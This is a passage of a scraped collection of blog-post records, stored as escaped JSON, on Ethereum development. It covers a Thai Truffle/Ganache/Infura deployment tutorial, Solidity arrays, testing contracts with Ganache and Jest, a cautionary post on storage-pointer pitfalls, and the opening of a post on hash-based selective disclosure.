\u0e42\u0e14\u0e22\u0e15\u0e23\u0e07truffle-config.js\u0e44\u0e1f\u0e25\u0e4c\u0e19\u0e35\u0e49\u0e43\u0e0a\u0e49\u0e43\u0e19\u0e01\u0e32\u0e23\u0e40\u0e0b\u0e15\u0e04\u0e48\u0e32\u0e15\u0e48\u0e32\u0e07 \u0e46 \u0e02\u0e2d\u0e07 local truffle project \u0e42\u0e14\u0e22\u0e1b\u0e01\u0e15\u0e34\u0e41\u0e25\u0e49\u0e27\u0e08\u0e30\u0e40\u0e0b\u0e15\u0e04\u0e48\u0e32 network \u0e15\u0e48\u0e32\u0e07 \u0e46 \u0e40\u0e0a\u0e48\u0e19 development network \u0e2d\u0e22\u0e39\u0e48\u0e17\u0e35\u0e48\u0e44\u0e2b\u0e19, Ethereum Mainnet \u0e2d\u0e22\u0e39\u0e48\u0e17\u0e35\u0e48\u0e44\u0e2b\u0e19 \u0e40\u0e0a\u0e48\u0e19\u0e43\u0e19\u0e44\u0e1f\u0e25\u0e4c\u0e19\u0e35\u0e49\u0e08\u0e30\u0e40\u0e0b\u0e15\u0e44\u0e27\u0e49 2 \u0e15\u0e31\u0e27\u0e04\u0e37\u0e2d development \u0e41\u0e25\u0e30 test \u0e40\u0e27\u0e25\u0e32\u0e40\u0e23\u0e32\u0e23\u0e31\u0e19\u0e04\u0e33\u0e2a\u0e31\u0e48\u0e07 truffle \u0e15\u0e48\u0e32\u0e07 \u0e46 \u0e01\u0e47\u0e08\u0e30\u0e21\u0e32\u0e14\u0e39\u0e44\u0e1f\u0e25\u0e4c\u0e19\u0e35\u0e49\u0e01\u0e48\u0e2d\u0e19\u0e27\u0e48\u0e32 network \u0e17\u0e35\u0e48\u0e40\u0e23\u0e32\u0e2a\u0e31\u0e48\u0e07\u0e19\u0e31\u0e49\u0e19\u0e0a\u0e35\u0e49\u0e44\u0e1b\u0e17\u0e35\u0e48\u0e44\u0e2b\u0e19 \u0e40\u0e0a\u0e48\u0e19truffle migrate --network development\u0e08\u0e30\u0e0a\u0e35\u0e49\u0e44\u0e1b\u0e17\u0e35\u0e48 network.development \u0e17\u0e35\u0e48\u0e40\u0e23\u0e32\u0e40\u0e0b\u0e15\u0e44\u0e27\u0e49 \u0e43\u0e19\u0e44\u0e1f\u0e25\u0e4c\u0e19\u0e35\u0e49\u0e40\u0e23\u0e32\u0e08\u0e30\u0e01\u0e25\u0e31\u0e1a\u0e21\u0e32\u0e41\u0e01\u0e49\u0e44\u0e1f\u0e25\u0e4c\u0e19\u0e35\u0e49\u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e43\u0e2b\u0e49\u0e0a\u0e35\u0e49\u0e44\u0e1b\u0e17\u0e35\u0e48 Ethereum Testnet \u0e41\u0e25\u0e30 Local Ethereum \u0e2b\u0e25\u0e31\u0e07\u0e08\u0e32\u0e01\u0e2b\u0e31\u0e27\u0e02\u0e49\u0e2d\u0e16\u0e31\u0e14\u0e44\u0e1b3. Metamask\u0e40\u0e23\u0e32\u0e08\u0e30\u0e43\u0e0a\u0e49 Metamask Wallet \u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e40\u0e01\u0e47\u0e1a Key \u0e17\u0e35\u0e48\u0e08\u0e30\u0e43\u0e0a\u0e49\u0e43\u0e19\u0e01\u0e32\u0e23 Deploy Smart Contract \u0e02\u0e36\u0e49\u0e19\u0e44\u0e1b\u0e1a\u0e19 Network \u0e15\u0e48\u0e32\u0e07 \u0e46 \u0e17\u0e35\u0e48\u0e44\u0e21\u0e48\u0e43\u0e0a\u0e48 Local Network \u0e42\u0e14\u0e22\u0e40\u0e02\u0e49\u0e32\u0e44\u0e1b\u0e17\u0e35\u0e48 metamask.io\u0e40\u0e21\u0e37\u0e48\u0e2d\u0e25\u0e07\u0e41\u0e25\u0e49\u0e27 Metamask \u0e08\u0e30\u0e2d\u0e22\u0e39\u0e48\u0e21\u0e38\u0e21\u0e02\u0e27\u0e32\u0e1a\u0e19\u0e02\u0e2d\u0e07 Chrome \u0e43\u0e2b\u0e49\u0e40\u0e23\u0e32\u0e01\u0e14\u0e17\u0e35\u0e48 icon \u0e41\u0e25\u0e49\u0e27\u0e2a\u0e23\u0e49\u0e32\u0e07\u0e01\u0e23\u0e30\u0e40\u0e1b\u0e4b\u0e32\u0e15\u0e32\u0e21\u0e02\u0e31\u0e49\u0e19\u0e15\u0e2d\u0e19\u0e08\u0e19\u0e21\u0e32\u0e16\u0e36\u0e07\u0e2b\u0e19\u0e49\u0e32\u0e19\u0e35\u0e49\u0e40\u0e21\u0e37\u0e48\u0e2d\u0e44\u0e14\u0e49 Address \u0e41\u0e25\u0e49\u0e27\u0e43\u0e2b\u0e49\u0e40\u0e23\u0e32 Copy Address \u0e02\u0e2d\u0e07\u0e01\u0e23\u0e30\u0e40\u0e1b\u0e4b\u0e32\u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e44\u0e1b\u0e02\u0e2d\u0e40\u0e07\u0e34\u0e19\u0e08\u0e32\u0e01 Ropsten Testnet \u0e17\u0e35\u0e48 https://faucet.metamask.io/\u0e43\u0e2b\u0e49\u0e40\u0e23\u0e32\u0e40\u0e1b\u0e25\u0e35\u0e48\u0e22\u0e19 Network \u0e02\u0e2d\u0e07 Metamask \u0e44\u0e1b\u0e17\u0e35\u0e48 Ropsten \u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e14\u0e39\u0e40\u0e07\u0e34\u0e19\u0e08\u0e32\u0e01 Ropsten \u0e02\u0e2d\u0e07 Address \u0e19\u0e35\u0e49\u0e08\u0e32\u0e01\u0e19\u0e31\u0e49\u0e19\u0e40\u0e23\u0e32\u0e08\u0e30\u0e44\u0e1b\u0e40\u0e2d\u0e32 Private Key \u0e08\u0e32\u0e01 Metamask \u0e40\u0e01\u0e47\u0e1a\u0e44\u0e27\u0e49\u0e14\u0e49\u0e27\u0e22 \u0e0b\u0e36\u0e48\u0e07\u0e08\u0e30\u0e43\u0e0a\u0e49\u0e43\u0e19\u0e01\u0e32\u0e23 Config Truffle \u0e42\u0e14\u0e22\u0e01\u0e14\u0e17\u0e35\u0e48\u0e1b\u0e38\u0e48\u0e21\u00a0\u2026 -> Account Detail -> Export Private Key4. Infura\u0e40\u0e21\u0e37\u0e48\u0e2d\u0e01\u0e48\u0e2d\u0e19\u0e40\u0e23\u0e32\u0e2d\u0e32\u0e08\u0e08\u0e30\u0e15\u0e49\u0e2d\u0e07\u0e15\u0e31\u0e49\u0e07 Ethereum Node \u0e40\u0e1e\u0e37\u0e48\u0e2d Sync \u0e01\u0e31\u0e1a Ethereum Network \u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e04\u0e38\u0e22\u0e01\u0e31\u0e1a Ethereum Network \u0e19\u0e31\u0e49\u0e19 \u0e46 \u0e41\u0e15\u0e48 Infura \u0e17\u0e33\u0e43\u0e2b\u0e49\u0e0a\u0e35\u0e27\u0e34\u0e15\u0e40\u0e23\u0e32\u0e07\u0e48\u0e32\u0e22\u0e02\u0e36\u0e49\u0e19\u0e40\u0e1e\u0e23\u0e32\u0e30 Infura \u0e15\u0e31\u0e49\u0e07 Node \u0e41\u0e25\u0e49\u0e27 Expose \u0e21\u0e32\u0e43\u0e2b\u0e49\u0e40\u0e23\u0e32\u0e43\u0e0a\u0e49\u0e07\u0e32\u0e19\u0e1f\u0e23\u0e35 \u0e46 \u0e42\u0e14\u0e22\u0e44\u0e1b\u0e17\u0e35\u0e48 infura.io \u0e41\u0e25\u0e49\u0e27\u0e2a\u0e21\u0e31\u0e04\u0e23\u0e41\u0e25\u0e30\u0e2a\u0e23\u0e49\u0e32\u0e07 Project \u0e44\u0e27\u0e49\u0e1e\u0e2d\u0e44\u0e14\u0e49\u0e41\u0e25\u0e49\u0e27\u0e43\u0e2b\u0e49\u0e40\u0e23\u0e32 Copy Project ID \u0e44\u0e27\u0e49 \u0e0b\u0e36\u0e48\u0e07\u0e40\u0e23\u0e32\u0e08\u0e30\u0e40\u0e2d\u0e32\u0e44\u0e1b\u0e40\u0e0b\u0e15\u0e43\u0e19 truffle \u0e40\u0e0a\u0e48\u0e19\u0e01\u0e31\u0e195. GanacheGanache \u0e40\u0e1b\u0e47\u0e19 Ethereum Node \u0e17\u0e35\u0e48\u0e40\u0e1b\u0e47\u0e19 Standalone \u0e44\u0e27\u0e49\u0e43\u0e2b\u0e49\u0e40\u0e23\u0e32\u0e43\u0e0a\u0e49\u0e07\u0e32\u0e19\u0e1a\u0e19\u0e40\u0e04\u0e23\u0e37\u0e48\u0e2d\u0e07\u0e02\u0e2d\u0e07\u0e40\u0e23\u0e32\u0e42\u0e14\u0e22 Ganache \u0e08\u0e30\u0e17\u0e33\u0e07\u0e32\u0e19\u0e41\u0e1a\u0e1a 1 Block/1 Transaction\u0e40\u0e23\u0e32\u0e08\u0e30\u0e43\u0e0a\u0e49 Ganache \u0e40\u0e1e\u0e23\u0e32\u0e30\u0e1a\u0e32\u0e07\u0e04\u0e23\u0e31\u0e49\u0e07\u0e40\u0e23\u0e32\u0e44\u0e21\u0e48\u0e2d\u0e22\u0e32\u0e01 Deploy \u0e02\u0e36\u0e49\u0e19\u0e44\u0e1b\u0e1a\u0e19 Ropsten \u0e40\u0e1e\u0e23\u0e32\u0e30\u0e43\u0e0a\u0e49\u0e40\u0e27\u0e25\u0e32\u0e19\u0e32\u0e19\u0e41\u0e25\u0e30\u0e40\u0e23\u0e32\u0e2d\u0e22\u0e32\u0e01\u0e14\u0e39\u0e02\u0e49\u0e2d\u0e21\u0e39\u0e25\u0e15\u0e48\u0e32\u0e07 \u0e46 \u0e07\u0e48\u0e32\u0e22 \u0e46\u0e1e\u0e2d Install \u0e41\u0e25\u0e49\u0e27\u0e43\u0e2b\u0e49\u0e40\u0e23\u0e32\u0e23\u0e31\u0e19\u0e02\u0e36\u0e49\u0e19\u0e21\u0e32\u0e41\u0e25\u0e30\u0e2a\u0e23\u0e49\u0e32\u0e07 Workspace \u0e42\u0e14\u0e22\u0e0a\u0e35\u0e49\u0e44\u0e1b\u0e17\u0e35\u0e48 truffle-config.js \u0e02\u0e2d\u0e07\u0e40\u0e23\u0e32\u0e08\u0e32\u0e01\u0e19\u0e31\u0e49\u0e19\u0e43\u0e2b\u0e49\u0e14\u0e39 port \u0e02\u0e2d\u0e07 RPC Server \u0e40\u0e0a\u0e48\u0e19\u0e02\u0e2d\u0e07\u0e1c\u0e21\u0e40\u0e1b\u0e47\u0e19 7545 \u0e43\u0e2b\u0e49\u0e40\u0e01\u0e47\u0e1a\u0e40\u0e25\u0e02\u0e19\u0e35\u0e49\u0e44\u0e27\u0e49\u0e44\u0e1b\u0e41\u0e01\u0e49\u0e44\u0e02\u0e44\u0e1f\u0e25\u0e4c truffle-config.js \u0e40\u0e0a\u0e48\u0e19\u0e01\u0e31\u0e196. \u0e25\u0e2d\u0e07 Deploy Smart Contract \u0e02\u0e36\u0e49\u0e19\u0e44\u0e1b\u0e1a\u0e19\u00a0Chain\u0e01\u0e48\u0e2d\u0e19\u0e2d\u0e37\u0e48\u0e19\u0e40\u0e23\u0e32\u0e15\u0e49\u0e2d\u0e07\u0e44\u0e1b\u0e41\u0e01\u0e49\u0e44\u0e02\u0e44\u0e1f\u0e25\u0e4c truffle-config.js \u0e14\u0e31\u0e07\u0e19\u0e35\u0e49\u0e08\u0e30\u0e40\u0e2b\u0e47\u0e19\u0e27\u0e48\u0e32\u0e40\u0e23\u0e32\u0e08\u0e30\u0e43\u0e0a\u0e49 process.env \u0e43\u0e19\u0e01\u0e32\u0e23\u0e14\u0e36\u0e07 GANACHE_PORT, SECRET_KEY \u0e41\u0e25\u0e30 INFURA_KEY \u0e42\u0e14\u0e22\u0e40\u0e23\u0e32\u0e08\u0e30\u0e43\u0e0a\u0e49 dotenv \u0e40\u0e1b\u0e47\u0e19\u0e15\u0e31\u0e27\u0e0a\u0e48\u0e27\u0e22\u0e43\u0e19\u0e01\u0e32\u0e23\u0e40\u0e0b\u0e15 Environment Variable \u0e43\u0e2b\u0e49\u0e40\u0e23\u0e32\u0e44\u0e1b\u0e2a\u0e23\u0e49\u0e32\u0e07\u0e44\u0e1f\u0e25\u0e4c\u0e0a\u0e37\u0e48\u0e2d\u00a0.env \u0e44\u0e27\u0e49\u0e02\u0e49\u0e32\u0e07 \u0e46 truffle-config.js \u0e41\u0e25\u0e49\u0e27\u0e43\u0e2a\u0e48\u0e02\u0e49\u0e2d\u0e21\u0e39\u0e25\u0e17\u0e35\u0e48\u0e44\u0e14\u0e49\u0e08\u0e32\u0e01\u0e02\u0e49\u0e2d\u0e17\u0e35\u0e48\u0e41\u0e25\u0e49\u0e27\u0e14\u0e31\u0e07\u0e19\u0e35\u0e49SECRET_KEY=<Your Secret Key>INFURAT_KEY=<Your Infura Project Id>GANACHE_PORT=7547\u0e40\u0e23\u0e32\u0e08\u0e33\u0e40\u0e1b\u0e47\u0e19\u0e15\u0e49\u0e2d\u0e07 Install dotenv \u0e41\u0e25\u0e30 truffle-hdwallet-provider \u0e14\u0e49\u0e27\u0e22 npmnpm install dotenv truffle-hd-wallet-provider\u0e40\u0e21\u0e37\u0e48\u0e2d\u0e17\u0e38\u0e01\u0e2d\u0e22\u0e48\u0e32\u0e07\u0e40\u0e2a\u0e23\u0e47\u0e08\u0e41\u0e25\u0e49\u0e27\u0e43\u0e2b\u0e49\u0e25\u0e2d\u0e07 deploy \u0e02\u0e36\u0e49\u0e19\u0e44\u0e1b\u0e1a\u0e19 Ganache \u0e14\u0e49\u0e27\u0e22\u0e04\u0e33\u0e2a\u0e31\u0e48\u0e07truffle migrate --network development\u0e16\u0e49\u0e32\u0e2d\u0e22\u0e32\u0e01 deploy \u0e02\u0e36\u0e49\u0e19\u0e1a\u0e19 Ropsten \u0e43\u0e2b\u0e49\u0e23\u0e31\u0e19truffle migrate --network ropsten\u0e40\u0e21\u0e37\u0e48\u0e2d\u0e40\u0e2a\u0e23\u0e47\u0e08\u0e41\u0e25\u0e49\u0e27\u0e40\u0e23\u0e32\u0e2a\u0e32\u0e21\u0e32\u0e23\u0e16\u0e40\u0e02\u0e49\u0e32\u0e44\u0e1b\u0e14\u0e39\u0e1a\u0e19 Ganache \u0e44\u0e14\u0e49 \u0e08\u0e30\u0e40\u0e2b\u0e47\u0e19\u0e27\u0e48\u0e32\u0e21\u0e35 Contract \u0e40\u0e1e\u0e34\u0e48\u0e21\u0e21\u0e32 3 \u0e15\u0e31\u0e27\u0e2a\u0e48\u0e27\u0e19\u0e1c\u0e25\u0e01\u0e32\u0e23\u0e23\u0e31\u0e19\u0e1a\u0e19 Ropsten \u0e08\u0e30\u0e2b\u0e19\u0e49\u0e32\u0e15\u0e32\u0e41\u0e1a\u0e1a\u0e19\u0e35\u0e49\u0e40\u0e23\u0e32\u0e2a\u0e32\u0e21\u0e32\u0e23\u0e16\u0e40\u0e02\u0e49\u0e32\u0e44\u0e1b\u0e14\u0e39\u0e44\u0e14\u0e49\u0e1a\u0e19 Ropsten Chain\u0e40\u0e23\u0e32\u0e2a\u0e32\u0e21\u0e32\u0e23\u0e16\u0e43\u0e0a\u0e49 truffle console \u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e40\u0e02\u0e49\u0e32\u0e44\u0e1b\u0e40\u0e23\u0e35\u0e22\u0e01 Contract \u0e02\u0e2d\u0e07\u0e40\u0e23\u0e32\u0e44\u0e14\u0e49\u0e14\u0e49\u0e27\u0e22 \u0e2d\u0e22\u0e48\u0e32\u0e25\u0e37\u0e21\u0e43\u0e2a\u0e48 --network ropsten \u0e2b\u0e23\u0e37\u0e2d --network developmentMetaCoin.deployed().then(function(instance){return instance });MetaCoin.deployed().then(function(instance){return instance.getBalance(\"0x15b5E3E6A947b790de45B485Bb850dee77D9aF9d\")});\u0e40\u0e2a\u0e23\u0e47\u0e08\u0e41\u0e25\u0e49\u0e27\u0e04\u0e23\u0e31\u0e1a\u0e2a\u0e33\u0e2b\u0e23\u0e31\u0e1a\u0e01\u0e32\u0e23\u0e40\u0e0b\u0e15\u0e2d\u0e31\u0e1e\u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e40\u0e23\u0e34\u0e48\u0e21\u0e40\u0e02\u0e35\u0e22\u0e19\u0e41\u0e25\u0e30\u0e01\u0e32\u0e23 Deploy Solidity Smart Contract \u0e1a\u0e19 Ethereum\u0e16\u0e49\u0e32\u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e19 \u0e46 \u0e0a\u0e2d\u0e1a\u0e1a\u0e17\u0e04\u0e27\u0e32\u0e21\u0e40\u0e01\u0e35\u0e48\u0e22\u0e27\u0e01\u0e31\u0e1a Blockchain \u0e02\u0e2d\u0e07\u0e1c\u0e21 \u0e1d\u0e32\u0e01\u0e41\u0e0a\u0e23\u0e4c\u0e1a\u0e17\u0e04\u0e27\u0e32\u0e21\u0e41\u0e25\u0e30\u0e01\u0e14\u0e15\u0e34\u0e14\u0e15\u0e32\u0e21\u0e40\u0e1e\u0e08\u0e41\u0e25\u0e30 Medium \u0e14\u0e49\u0e27\u0e22\u0e19\u0e30\u0e04\u0e23\u0e31\u0e1a", "responses": ""}, {"title": "Arrays in\u00a0Solidity", "author_name": "Aventus Network", "link": "https://hackernoon.com/arrays-in-solidity-b65c1326f48b?source=search_post", "post_date": "Jul 20, 2018", "readtime": "6 min read", "upvotes": "191", "content": "Arrays in\u00a0SolidityAventus NetworkBlockedUnblockFollowFollowingJul 20, 2018This is the second Aventus technical blog on Solidity from Alex Pinto, a recent addition to our blockchain engineering team. You can read his first post on Working with Strings in Solidity.", "responses": ""}, {"title": "Minimal Solidity Contract Testing with Ganache and\u00a0Jest", "author_name": "Adrian Li", "link": "https://hackernoon.com/minimal-solidity-contract-testing-with-ganache-and-jest-f735547d9643?source=search_post", "post_date": "Dec 30, 2018", "readtime": "4 min read", "upvotes": "205", "content": "Minimal Solidity Contract Testing with Ganache and\u00a0JestAdrian LiBlockedUnblockFollowFollowingDec 30, 2018Recently, while writing some frontend tooling for dapps (stay tuned), I encountered the need to quickly test that my library would work with real Solidity contracts.While I always recommend dapp makers to start with a Truffle project, sometimes you need something a little more lightweight. For example, instead of having to run migrations, maybe you just want to compile a smart contract and test right-away.No worries, the Truffle suite of tools has got you covered!In this tutorial, I will show you how to setup minimal smart contract testing with Ganache and Jest.If you don\u2019t need a step-by-step explanation, the example repo is right here:adrianmcli/ganache-jest-example\ud83d\ude80 Minimal Solidity contract testing with Ganache and Jest - adrianmcli/ganache-jest-examplegithub.comJust three\u00a0stepsIn essence, there are only three things you need to do:Compile the Solidity contractSpawn a test \u201cblockchain\u201dDeploy the contract.Sounds daunting right? But thanks to Truffle and the community at large, this is actually all a lot simpler than you might think.Our ContractBefore we get started, let\u2019s create our contract, SimpleStorage.sol:This contract is very simple, it allows you to get and set an integer, that\u2019s it.Compiling the\u00a0contractWe\u2019re going to be using solc-js to compile our Solidity contract. This means we will have to conform to their way of doing things and this might get a little funky so let\u2019s create a new file for that.Start a new file called compile.js and paste in the following:We are exporting a function compile that will take in a filename and look for it in the same folder. We pass solc the options object (i.e. input) in the way that it wants and it spits out a JSON that we can extract our artifact from.Do note that I also have a version of the repo using truffle-compile instead of solc. There are pros and cons to either one, feel free to make your own judgement call.Spawning a test blockchain with\u00a0GanacheFor this part and the next, I\u2019ll be explaining the concepts first and then I\u2019ll show you the whole file where it all comes together. So please pay attention, I promise it\u2019ll pay off!Spawning a test blockchain is way simpler than I could have ever hoped for. Literally the only thing you need to do is:// import Ganacheconst Ganache = require(\"ganache-core\");// spawn the test \"blockchain\" providerconst provider = Ganache.provider();// use it like how you would normally use a providerconst web3 = new Web3(provider);const accounts = await web3.eth.getAccounts();The one-liner Ganache.provider() essentially does all the heavy lifting for you. It basically spawns a blockchain in-memory and gives you the provider object to interact with it.From the provider, we can easily get theweb3 instance and subsequently the accounts array that we will need in the next step.Deploy your\u00a0contractNow that we have web3 as well as the contract artifact, we can deploy it onto our test blockchain.const instance = new web3.eth.Contract(SimpleStorage.abi);const deployedInstance = await instance.deploy({  data: SimpleStorage.evm.bytecode.object}).send({  from: accounts[0],  gas: 150000});This is standard usage of the Web3.js API (v1.0). We first create our contract instance by passing in the ABI from our artifact SimpleStorage.abi. And then we deploy it by calling\u00a0.deploy() with the bytecode from our contract artifact, and finally send() from our account with a specified gas amount to make sure it goes through.Putting it all\u00a0togetherNow that we understand what we need to do, we can make a new file called test.js and start writing our test. Most of what we talked about is setting up the environment for our tests, so it will go under the beforeAll() hook from Jest.At this point, I am going to show you the entirety of this file:Note that the provider, web3, accounts, andcontractInstance variables are declared outside of the beforeAll() hook so that we can use those them in our tests.We also have an afterAll() hook where we call stop() on the provider to prevent memory leaks.Finally, the actual example test demonstrates setting and getting a value.Some thoughtsOf course, this might get a little un-wieldy if you have many different contracts and they inherit from each other. For those use-cases, I would highly recommend a traditional Truffle project.However, if you have something simple to test, or if you want to test out your frontend separately from your Truffle project, this is a great option that allows you to do so.Do keep in mind that spawning a Ganache provider does take a couple seconds, so try not to do it all-over the place. If you start having to do that, it may be another sign that you should consider converting your project to a full-on Truffle project instead.This format may not be for everyone, so do check out the example repo that you can clone and run for yourself!adrianmcli/ganache-jest-example\ud83d\ude80 Minimal Solidity contract testing with Ganache and Jest - adrianmcli/ganache-jest-examplegithub.comIf you liked this article, please give me a few claps!", "responses": ""}, {"title": "Storage Pointers in\u00a0Solidity", "author_name": "Rob Hitchens", "link": "https://blog.b9lab.com/storage-pointers-in-solidity-7dcfaa536089?source=search_post", "post_date": "Nov 16, 2018", "readtime": "6 min read", "upvotes": "178", "content": "Storage Pointers in\u00a0Solidity\u201cHere be\u00a0dragons\u201dRob HitchensBlockedUnblockFollowFollowingNov 16, 2018Photo by mauR\u00cdCIO santos on\u00a0UnsplashThis post is a warning.Immutability is a two-edged sword. On the one hand, everyone is assured that software will execute as written because no departures from the deployed code will be permitted. On the other hand, immutability implies a very unforgiving environment. This is one of the reasons for adopting a minimalist approach to contract design.Implicitly, minimalism means contract functions should be self-explanatory and easy to reason about. It\u2019s important that code works and it\u2019s important that observers can see that it works.This is why storage pointers as a \u201cfeature\u201d of the language make me uncomfortable. They can be created unintentionally, they are easy to overlook and the consequences of overlooking them can be catastrophic. Mapmakers of old would warn adventurers about treacherous regions where strange and dangerous and unexpected things can and do happen. They had a short-form expression for mysterious mortal dangers: \u201cHere be dragons.\u201dWhat are Storage Pointers?Solidity has memory variables that don\u2019t persist beyond the execution of a given function, and storage variables that are part of the contract\u2019s persistent state.Here\u2019s a simple (and safe) example:contract Safe {  uint x = 100;  function getXAndY() public view returns(uint, uint) {   uint y = 101;   return (x,y); }}So far, so good. We get (100,101) as expected.There is more going on here, implicitly, than meets the eye. For now, let\u2019s just say \u201cx\u201d is a storage variable and \u201cy\u201d is a memory variable. It\u2019s implied because \u201cx\u201d was declared globally and \u201cy\u201d was declared inside a function.\u201cx\u201d and \u201cy\u201d are both \u201cscalar\u201d variables. If you\u2019re not familiar with the term, it just means they are of a basic type (in this case, an unsigned integer) with a single value. This is going to be important, because the rules that apply to scalar variables with regard to this issue of memory and storage are different than the rules that apply to indexed variables (arrays and mappings) and structs. That can lead to\u00a0\u2026Surprise!Have a look at this:contract FirstSurprise {  struct Camper {   bool isHappy; }  mapping(uint => Camper) public campers;  function setHappy(uint index) public {   campers[index].isHappy = true; } function surpriseOne(uint index) public {   Camper c = campers[index];   c.isHappy = false; }}Suppose we \u201csetHappy(0)\u201d then invoke \u201csurpriseOne(0)\u201d. Do you suppose campers[0].isHappy? You can be forgiven if you think so, but it is overwritten byc.isHappy = false;What\u2019s going on?\u201cc\u201d is a struct, and we\u2019re allowed to declare them as \u201cmemory\u201d or \u201cstorage\u201d pointers. The default is storage, so it\u2019s a storage pointer. We said it equals a \u201ccampers\u201d at a certain index. Now, it might be inefficient to copy a whole struct from storage to memory, so Solidity just gives \u201cc\u201d a \u201cstorage pointer\u201d to wherever the values actually reside. Great, but then we\u2019re at risk of accidentally overwriting storage, which we did when we set one of c\u2019s members to something new.I am not big fan of this. In my opinion, surprise is an anti-feature in an unforgiving environment.In fairness, the compiler has improved from early days and there are warnings. For example:Variable is declared as storage pointer. Use explicit \u201cstorage\u201d keyword to silence this warning.This is a warning to let you know that you are declaring a struct, array or mapping (which you should not do) in a function and it\u2019s going to implicitly be a \u201cstorage\u201d (pointer) and you might not be aware of it.What if you follow the suggestion?Camper storage c;That will silence the first warning and give you something else:Uninitialized storage pointer.What does that mean? That means it\u2019s a storage pointer that doesn\u2019t know what it should point to because it wasn\u2019t set to anything with \u201c= expression.\u201d So, it will just point to slot 0. That means if you set \u201cc\u201d to anything, that will overwrite whatever is in slot 0. Yikes! This reminds me of IT Haiku circulars that went around before memes caught on. Here\u2019s mine, for entertainment purposes:Something in slot 0.Probably important.Now, it is gone.Did I mention I do not like this?Have a look here for another example of how this can and does create quite unexpected results: https://ethereum.stackexchange.com/questions/62384/bytes-variables-are-connected/62394#62394Another surpriseHere\u2019s the same contract with an added uint variable that is set to 100, and another surprise:contract AnotherSurprise {  struct Camper {   bool isHappy; }  uint public x = 100;  mapping(uint => Camper) public campers;  function setHappy(uint index) public {   campers[index].isHappy = true; }  function surpriseTwo() public {   Camper storage c;   c.isHappy = false; }We were warned that \u201cc\u201d is an \u201cuninitialized storage pointer\u201d (meaning, it points to slot 0). Try \u201csurpriseTwo()\u201d. Then, look at \u201cx().\u201d What happened to poor Mr. X? \u201cx\u201d isn\u2019t 100 anymore. It\u2019s 0, because \u201cfalse\u201d cast as a uint is 0. And guess what? \u201cx\u201d just happened to reside in the first storage slot, so when the errant uninitialized storage pointer decided to write something down it scribbled on top of \u201cx\u201d. Sorry, Mr. X. Unlucky for you.Slot 0 could even be the \u201c.length\u201d of a dynamic array or the owner of the contract. Nothing good can come out of accidentally overwriting important data. And, it\u2019s all important because we believe in minimalist design.Why are Storage Pointers even\u00a0useful?There are arguments in favor of storage pointers. For one thing, they reduce the amount of data that gets passed around and that saves gas. They can also lead to readable code. Consider this usage:function slightOfHand(uint index) public {   Camper storage c = campers[index];   c.isHappy = false;}That updates the storage and means you don\u2019t need to repeat the more verbose form, \u201ccampers[index]\u201d, but coders and reviewers need to be aware that \u201cc\u201d is really the same as writing the more verbose expression. In other words, it\u2019s short for:campers[index].isHappy = false;My discomfort with this is that this is very easy to overlook, especially for learners. It contributes to mental overhead when we should be aiming for simplicity. It can lead to a surprise. Dragons!Safety HabitsStorage pointers are advantageous when you know what you\u2019re doing. But how can newbies operate safely while they learn? Here are some tips. Please comment!You can generally avoid trouble by adopting these habits:Never declare a mapping inside a function. There be dragons.Never declare persistent storage inside a function, even if the compiler seems to let you.In your functions, always explicitly declare structs and arrays as either transient \u201cmemory\u201d or \u201cstorage\u201d pointers. This habit helps you pause and think about what\u2019s going on.Never ignore warnings about storage pointers. This bears mentioning because they don\u2019t stand out against other warnings that can be safely ignored. Storage pointer warnings == dragons in your vicinity. Don\u2019t shrug it off.Feel free to instantiate storage pointer aliases for verbose syntax, but form the habit of using them on a read-only basis. For example:Product storage p = productStructs[productIdList[productListRow]];return (p.id, p.desc, p.price);6. Use extreme caution when setting a variable that was initialized with a reference to something in storage.p.price = // Stop. Caution. Do you know where this is going?Storage pointers are a subtlety in Solidity. It takes practice to learn what they are and how they work.If this post helps you remember storage pointers exist so you\u2019re aware that they might be in play (even unintentionally) then hopefully that will prompt an impulse to double-check assumptions, thoroughly test and reinforce awareness of the need for thorough code audits before releasing code in production.At B9lab, we are dedicated to guiding students to the top of this field. Our hands-on training programs mentored by instructors like myself and workshops prepare students for stringent certification exams.Start with your Ethereum Developer Certification and consider branching out to Quorum Specialist (think \u201centerprise\u201d) or Quality Assurance Specialist. Maybe even check out Hyperledger, Corda and EOS. They too are interesting and different.", "responses": ""}, {"title": "Super-Simple Zero-Knowledge Proofs in Solidity for\u00a0Ethereum", "author_name": "Rob Hitchens", "link": "https://medium.com/robhitchens/selective-disclosure-with-proof-f6a1ac7be978?source=search_post", "post_date": "Sep 8, 2018", "readtime": "7 min read", "upvotes": "179", "content": "Super-Simple Zero-Knowledge Proofs in Solidity for\u00a0EthereumA simple and efficient storage structure for arbitrarily large data sets with selective disclosure of contents and proof of authenticity.Rob HitchensBlockedUnblockFollowFollowingSep 8, 2018\u2026 and with a method for designing smart contract logic\u00a0contingent on proven external states.\u201cperson holding passport\u201d by Agus Dietrich on\u00a0UnsplashIn case the hash concepts are new, check out this gentle introduction: https://simple.wikipedia.org/wiki/Cryptographic_hash_functionGenerally-speaking, it\u2019s a bad idea to store anything too large in a blockchain owing to the high cost of storage itself. A common solution to this problem is to store only the hash of a large object in a smart contract, and then store the bulk of the object elsewhere.Without delving into specific use-case details, suffice it to say that a smart contract can store a great deal of information about an object\u2019s origin, lineage, and the approval/on-boarding process that led to the on-chain immortalizing of a certain hash that everyone will recognize as \u201cauthentic\u201d. An observer in possession of an object simply hashes the object and then uses the smart contract to confirm authenticity and to inspect other interesting details.The following description addresses a limitation of the common approach described above.Problem:Imagine Alice has objects such as 1) a driver\u2019s license, 2) a passport and 3) a birth certificate. Each document is represented by a JSON object that includes all the data fields present. Each such JSON object is issued by an authoritative registry, and we can imagine a smart contract that records the hashes of authentic documents. Nothing gets on that list without following the strict on-boarding process of the contract.Imagine Alice wants to show Bob her date of birth without disclosing any further personal details.Since each form of ID contains a date of birth, she has three possible ways to reveal this detail (her birthday) to Bob.Since each form of ID is easily authenticated by a hash on a blockchain, Bob would be able to consult the appropriate registry which would confirm the authenticity of any document Alice decided to reveal.For this to work, Alice would have to give Bob the entire object. Alice faces a dilemma. She has three objects to choose from, but each object contains more information than Alice wants to reveal, for example her home address, her travel history and her place of birth depending on whether she chooses to reveal her complete driver\u2019s license, her entire 